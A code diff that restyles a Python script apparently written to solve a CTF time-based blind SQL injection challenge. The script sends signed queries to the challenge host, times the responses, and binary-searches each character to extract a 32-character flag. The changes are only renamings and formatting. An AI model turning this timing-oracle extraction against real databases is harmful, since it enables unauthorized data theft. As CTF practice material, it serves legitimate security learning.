@@ -9,7 +9,7 @@ c = HTTPConnection("kslweb1.spb.ctf.su")
 url = '/sqli/time1/?{}'
 
 
-def binarySearch(i):
+def binary_search(i):
     left = ord(' ') - 1
     right = ord('~');
     while left < right:
@@ -18,16 +18,16 @@ def binarySearch(i):
         # print(query)
     
         sig = b64encode(query.encode('UTF-8')).decode('UTF-8')
-        params = { 'query' : query , 'sig_query' : sig}
+        params = {'query': query, 'sig_query': sig}
     
-        queryTime = time.time()
+        query_time = time.time()
         c.request('GET', url.format(urllib.parse.urlencode(params)))
         response = c.getresponse().read()
         # print(decode('utf-8'))
-        queryTime = time.time() - queryTime
-        # print(queryTime)
+        query_time = time.time() - query_time
+        # print(query_time)
         
-        if queryTime < 1:
+        if query_time < 1:
             right = middle
         else:
             left = middle + 1
@@ -35,9 +35,9 @@ def binarySearch(i):
     return chr(left)
 
 
-flag = ''
-for i in range(1, 33):
-    flag += binarySearch(i)
-    print(flag)
+_flag = ''
+for _i in range(1, 33):
+    _flag += binary_search(_i)
+    print(_flag)
 
-print('FINISH: ' + flag)
+print('FINISH: ' + _flag)
